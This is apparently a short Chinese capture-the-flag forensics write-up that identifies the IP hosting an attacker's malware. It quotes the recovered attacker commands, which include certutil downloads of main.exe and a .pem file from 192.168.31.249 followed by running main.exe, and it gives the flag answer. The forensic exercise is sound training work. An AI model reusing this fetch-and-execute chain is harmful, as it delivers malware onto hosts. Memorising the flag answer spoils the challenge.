## 3

> 通过本地 PC RDP 到服务器并且找到黑客托管恶意程序 IP 为, 将黑客托管恶意程序 IP 作为 FLAG 提交

在第一题中，分析的攻击者执行的命令

```shell
whoami
pwd
certutil -urlcache -split -f http://192.168.31.249/main.exe
certutil -urlcache -split -f http://192.168.31.249/mypublic.pem
echo 647224830 > qq.txt
./main.exe
```

即可确定答案

```flag
flag{192.168.31.249}
```
